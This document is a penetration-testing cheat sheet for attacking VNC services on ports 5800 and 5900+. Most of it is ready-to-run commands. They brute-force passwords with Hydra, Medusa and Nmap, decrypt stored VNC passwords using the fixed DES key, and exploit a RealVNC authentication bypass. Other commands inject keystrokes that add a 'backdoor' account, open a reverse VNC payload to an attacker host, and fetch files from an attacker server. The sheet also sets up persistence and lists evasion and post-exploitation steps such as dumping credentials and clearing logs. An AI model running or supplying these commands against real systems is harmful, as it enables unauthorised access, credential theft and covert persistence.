# VNC ENUMERATION (Port 5900+)

## PORT OVERVIEW
```
Port 5900 - VNC (RFB protocol, display :0)
Port 5901 - VNC (display :1)
Port 5902 - VNC (display :2)
Port 590X - VNC (display :X)
Port 5800 - VNC over HTTP (web interface)
```

## BANNER GRABBING & VERSION DETECTION
```bash
nmap -sV -p5900,5901 <IP>                       # Service/Version detection
nmap -sV -p5800-5910 <IP>                       # Scan common VNC ports
nc -nv <IP> 5900                                # Manual connection (banner)
telnet <IP> 5900                                # Banner grab
```

## NMAP VNC ENUMERATION
```bash
nmap --script "vnc-*" -p5900 <IP>               # All VNC scripts
nmap --script vnc-info -p5900 <IP>              # VNC server info
nmap --script vnc-brute -p5900 <IP>             # Brute force
nmap --script vnc-title -p5900 <IP>             # Get desktop title
nmap --script realvnc-auth-bypass -p5900 <IP>   # RealVNC auth bypass (CVE-2006-2369)
```

## VNC VERSION DETECTION
```bash
# Connect and read banner
echo "" | nc -nv <IP> 5900                      # Returns: RFB 003.008

# Common VNC versions
RFB 003.003                                     # VNC 3.3
RFB 003.007                                     # VNC 3.7
RFB 003.008                                     # VNC 3.8 (most common)
RFB 004.000                                     # Intel AMT KVM
RFB 004.001                                     # RealVNC 4.6
```

## VNC CLIENTS
```bash
# Linux VNC clients
vncviewer <IP>:5900                             # TigerVNC viewer
vncviewer <IP>::5900                            # Alternative syntax
vncviewer <IP>:0                                # Display :0 (port 5900)
vncviewer <IP>:1                                # Display :1 (port 5901)

# RealVNC
realvncviewer <IP>:5900

# Remmina (GUI)
remmina                                         # GUI VNC client

# xvnc4viewer
xvnc4viewer <IP>:5900

# Windows VNC clients
# - TightVNC
# - RealVNC
# - UltraVNC
```

## AUTHENTICATION TESTING
```bash
# Test for no authentication (None)
vncviewer <IP>:5900                             # Try direct connection

# If no password required, you'll connect immediately

# Test with password
vncviewer <IP>:5900
# Enter password when prompted

# Common default passwords
password
123456
admin
vnc
root
toor
```

## BRUTE FORCE ATTACKS
```bash
# Hydra VNC brute force
hydra -P passwords.txt vnc://<IP>               # Password only (no username)
hydra -P /usr/share/wordlists/rockyou.txt vnc://<IP>
hydra -P passwords.txt -s 5900 vnc://<IP>       # Specify port

# Nmap VNC brute force
nmap --script vnc-brute -p5900 <IP>
nmap --script vnc-brute --script-args passdb=passwords.txt -p5900 <IP>

# Medusa
medusa -h <IP> -P passwords.txt -M vnc
medusa -h <IP> -P /usr/share/wordlists/rockyou.txt -M vnc -n 5900

# Patator
patator vnc_login host=<IP> password=FILE0 0=passwords.txt -x ignore:fgrep='Authentication failure'
```

## VNC PASSWORD FILES
```bash
# VNC stores encrypted passwords in files
# Common locations:

# Linux
~/.vnc/passwd                                   # User VNC password
/root/.vnc/passwd                               # Root VNC password

# Windows
HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\vncserver   # Registry (RealVNC)
HKEY_LOCAL_MACHINE\SOFTWARE\TightVNC\Server     # Registry (TightVNC)
C:\Program Files\RealVNC\config.txt             # RealVNC config
C:\Program Files\TightVNC\vnc.ini               # TightVNC config

# Extract and crack VNC password
# If you have file access (SMB, SSH, etc.)

# Copy passwd file
cat ~/.vnc/passwd                               # View encrypted password

# Decrypt VNC password
vncpwd /path/to/.vnc/passwd                     # vncpwd tool
```

## VNC PASSWORD CRACKING
```bash
# VNC uses DES encryption with fixed key (weak!)
# Maximum password length: 8 characters

# vncpwd (decrypt VNC password file)
apt install vncpwd
vncpwd ~/.vnc/passwd                            # Decrypt password

# Online VNC password decryptor
# If you have the encrypted hex bytes

# Example VNC password decryption (Python)
python3 -c "import d3des; print(d3des.decrypt(bytes.fromhex('ENCRYPTED_HEX'), b'\xe8\x4a\xd6\x60\xc4\x72\x1a\xe0'))"
```

## METASPLOIT VNC MODULES
```bash
msfconsole
use auxiliary/scanner/vnc/vnc_none_auth         # Check for no auth
use auxiliary/scanner/vnc/vnc_login             # Login scanner
use auxiliary/admin/vnc/vnc_keyboard_exec       # Execute keystrokes

# Example: Check for no authentication
set RHOSTS <IP>
run

# Example: Brute force
use auxiliary/scanner/vnc/vnc_login
set RHOSTS <IP>
set PASS_FILE /usr/share/wordlists/rockyou.txt
run
```

## VNC OVER HTTP (PORT 5800)
```bash
# Some VNC servers provide web interface on port 5800

# Access via browser
http://<IP>:5800                                # Java applet viewer
http://<IP>:5800/vnc.html                       # HTML5 viewer

# Check with curl
curl http://<IP>:5800/                          # Check if web interface exists

# If accessible, connect via browser (may require Java)
```

## SCREENSHOT CAPTURE
```bash
# VNC allows viewing desktop without interaction
# Capture screenshot for reconnaissance

# vncsnapshot (capture screenshot)
apt install vncsnapshot
vncsnapshot <IP>:5900 screenshot.jpg            # Capture to JPEG
vncsnapshot -passwd /path/to/passwd <IP>:5900 screenshot.jpg  # With password file

# Alternative: connect and manually screenshot
vncviewer <IP>:5900
# Take screenshot with OS screenshot tool
```

## VNC INJECTION (SEND KEYSTROKES)
```bash
# If you have VNC access, send keystrokes to victim

# Metasploit keyboard injection
use auxiliary/admin/vnc/vnc_keyboard_exec
set RHOSTS <IP>
set PASSWORD password
set CMD "cmd.exe"                               # Command to type
run

# Manual keyboard injection via vncdo
pip install vncdo
vncdo -s <IP>::5900 -p password type "whoami"   # Type command
vncdo -s <IP>::5900 -p password key enter       # Press Enter
vncdo -s <IP>::5900 -p password type "net user backdoor Password123! /add"
vncdo -s <IP>::5900 -p password key enter
```

## VNC SCREEN RECORDING
```bash
# Record VNC session for later analysis

# vncrec (record VNC session)
vncrec -record session.vnc <IP>:5900            # Record session
vncplay session.vnc                             # Playback recording

# Alternative: use screen recording software while connected
```

## REALVNC AUTHENTICATION BYPASS (CVE-2006-2369)
```bash
# RealVNC 4.1.1 and earlier auth bypass
# Allows connection without password

# Nmap script
nmap --script realvnc-auth-bypass -p5900 <IP>

# Metasploit module
use auxiliary/admin/vnc/realvnc_41_bypass
set RHOST <IP>
run

# Manual exploitation
# Modify VNC client to send authentication type 1 (None)
```

## VNC REVERSE CONNECTION
```bash
# VNC "listening mode" - victim connects to attacker
# Useful for bypassing firewalls

# Attacker: Start VNC viewer in listening mode
vncviewer -listen 5500                          # Listen on port 5500

# Victim: Connect back to attacker
vncviewer -connect <attacker_IP>:5500           # Reverse connection

# Metasploit reverse VNC
use exploit/multi/handler
set PAYLOAD windows/vncinject/reverse_tcp
set LHOST <attacker_IP>
set LPORT 4444
run
```

## ENUMERATE VNC DISPLAYS
```bash
# VNC supports multiple displays
# Display :0 = port 5900
# Display :1 = port 5901
# Display :N = port 5900+N

# Scan for all VNC displays
nmap -sV -p5900-5910 <IP>                       # Scan ports 5900-5910

# Try connecting to each display
for i in {0..10}; do
  echo "Trying display :$i (port $((5900+i)))"
  timeout 2 vncviewer <IP>::$((5900+i)) &>/dev/null && echo "Display :$i is accessible"
done
```

## VNC OVER SSH TUNNEL
```bash
# Tunnel VNC over SSH for encryption

# Create SSH tunnel
ssh -L 5900:localhost:5900 user@<IP>            # Forward local 5900 to remote 5900

# Connect to localhost
vncviewer localhost:5900                        # Connects to remote VNC via tunnel

# Alternative: reverse tunnel (victim to attacker)
ssh -R 5900:localhost:5900 attacker@<attacker_IP>  # On victim
vncviewer localhost:5900                        # On attacker
```

## VNC PRIVILEGE ESCALATION
```bash
# If VNC is running as SYSTEM/root
# You get full system access

# Check VNC process owner
ps aux | grep vnc                               # Linux
tasklist /v | findstr vnc                       # Windows

# If VNC running as root/SYSTEM
# You have full system privileges via VNC session

# Common privilege escalation via VNC:
# 1. VNC running as root/SYSTEM
# 2. Open terminal/command prompt via VNC
# 3. Execute privileged commands
```

## VNC PERSISTENCE
```bash
# After gaining access, ensure VNC stays accessible

# Linux: Enable VNC on boot
# Add to /etc/rc.local
vncserver :1 -geometry 1920x1080 -depth 24

# Create systemd service
cat > /etc/systemd/system/vncserver.service <<EOF
[Unit]
Description=VNC Server
After=syslog.target network.target

[Service]
Type=forking
User=root
ExecStart=/usr/bin/vncserver :1
ExecStop=/usr/bin/vncserver -kill :1

[Install]
WantedBy=multi-user.target
EOF
systemctl enable vncserver.service

# Windows: Add to startup
# Add registry key or create scheduled task
```

## COMMON MISCONFIGURATIONS
```
☐ VNC accessible from internet
☐ No authentication (auth type: None)
☐ Weak/default password
☐ VNC running as root/SYSTEM
☐ Unencrypted VNC (no TLS/SSL)
☐ No firewall rules restricting VNC access
☐ VNC password stored in plain config files
☐ Old VNC version (known CVEs)
☐ VNC over HTTP without authentication
☐ Multiple VNC displays accessible
```

## QUICK WIN CHECKLIST
```
☐ Test for no authentication (auth type: None)
☐ Test default passwords (password, admin, vnc)
☐ Brute force weak passwords
☐ Check for VNC over HTTP (port 5800)
☐ Check for multiple displays (ports 5900-5910)
☐ Check for RealVNC auth bypass (CVE-2006-2369)
☐ Capture screenshot (reconnaissance)
☐ Check if VNC is running as root/SYSTEM
☐ Look for VNC password files (SMB, SSH access)
☐ Test for reverse VNC connection
```

## ONE-LINER FULL ENUMERATION
```bash
# Quick VNC enumeration
nmap -sV -p5800,5900-5910 --script vnc-info,vnc-brute,realvnc-auth-bypass <IP>

# With password
vncviewer <IP>:5900

# Screenshot capture
vncsnapshot <IP>:5900 screenshot.jpg

# Brute force
hydra -P /usr/share/wordlists/rockyou.txt vnc://<IP>
```

## ADVANCED TECHNIQUES
```bash
# VNC traffic sniffing
# VNC passwords sent in cleartext (after DES encryption)
# Can be intercepted and decrypted

# Wireshark filter for VNC
tcp.port == 5900

# Extract VNC password from pcap
# Look for Authentication packet, extract DES-encrypted password

# VNC MITM attack
# Intercept VNC connection and relay/modify traffic

# VNC clipboard hijacking
# Access shared clipboard between client and server
```

## VNC VARIANTS
```bash
# Different VNC implementations

# TightVNC
# Features: File transfer, chat
# Default port: 5900

# RealVNC
# Features: Encryption, authentication
# Default port: 5900
# Known CVEs: CVE-2006-2369 (auth bypass)

# UltraVNC
# Features: File transfer, chat, encryption plugin
# Default port: 5900
# Known CVEs: CVE-2006-2369, CVE-2008-0623

# TigerVNC
# Features: High performance
# Default port: 5900

# x11vnc
# Features: VNC for existing X11 display
# Default port: 5900
```

## POST-EXPLOITATION (AFTER VNC ACCESS)
```bash
# After gaining VNC access:
1. Capture screenshot (identify user, applications)
2. Open terminal/command prompt
3. Enumerate system (whoami, systeminfo, ipconfig)
4. Enumerate users and groups
5. Search for sensitive files (credentials, documents)
6. Dump credentials (SAM, LSA, browser passwords)
7. Install persistence (backdoor user, scheduled task)
8. Lateral movement to other hosts
9. Exfiltrate data
10. Cover tracks (clear logs)

# Quick enumeration via VNC
# Open cmd.exe or terminal via VNC GUI
whoami
systeminfo
ipconfig /all
net user
net localgroup administrators
dir C:\Users\*\Desktop
dir C:\Users\*\Documents

# Upload tools
# Use VNC file transfer feature (if available)
# Or download via PowerShell/curl from VNC session
```

## VNC FILE TRANSFER
```bash
# Some VNC variants support file transfer

# TightVNC file transfer
# Click "Transfer Files" button in viewer
# Drag and drop files

# UltraVNC file transfer
# Right-click in viewer -> File Transfer
# Upload/download files via GUI

# Alternative: Use command line in VNC session
# PowerShell download
powershell -c "Invoke-WebRequest -Uri http://<attacker>/file.exe -OutFile C:\temp\file.exe"

# Linux download
wget http://<attacker>/file.sh -O /tmp/file.sh
curl http://<attacker>/file.sh -o /tmp/file.sh
```

## DEFENSE EVASION
```bash
# Minimize VNC detection

# Use VNC over SSH tunnel (encrypted, looks like SSH traffic)
ssh -L 5900:localhost:5900 user@<IP>

# Use reverse VNC connection (bypasses inbound firewall)
# Victim connects to attacker

# Use non-standard port
# Configure VNC on different port (e.g., 8080)

# Limit connection time
# Connect briefly, disconnect to avoid detection
```
